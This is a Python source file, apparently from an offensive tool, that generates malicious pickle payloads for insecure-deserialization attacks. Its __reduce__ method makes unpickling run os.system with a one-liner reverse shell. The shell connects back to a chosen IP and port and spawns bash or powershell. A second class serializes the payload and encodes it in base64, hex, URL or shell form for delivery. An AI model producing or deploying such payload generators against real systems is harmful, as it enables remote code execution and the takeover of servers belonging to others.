import pickle
import os
from .encoded import Encode

class Desserialize(object):

    def __init__(self,ip:str,porta:str,sistema:str):
        self.__ip = ip
        self.__porta = porta
        self.__sistema = sistema

    def __reduce__(self) -> tuple:
        match self.__sistema:
            case "Windows":
                return (os.system,(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.__ip}\",{self.__porta}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"powershell\")'",))
            case "Linux":
                return (os.system,(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.__ip}\",{self.__porta}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",))    
                
class ObjetoMalicioso():

    def __init__(self,ip:str,porta:str,encode:str,sistema:str):
        self.__ip = ip
        self.__porta = porta
        self.__encode = encode
        self.__sistema = sistema

    def Objeto_Serializado(self):
        Object = pickle.dumps(Desserialize(self.__ip,self.__porta,self.__sistema))
        match self.__encode:
            case "b64":
                Encode.base64(Object)
            case "shell":
                Encode.shell(Object)
            case "urlencode":
                Encode.urlencode(Object)
            case "hex":
                Encode.hexadecimal(Object)
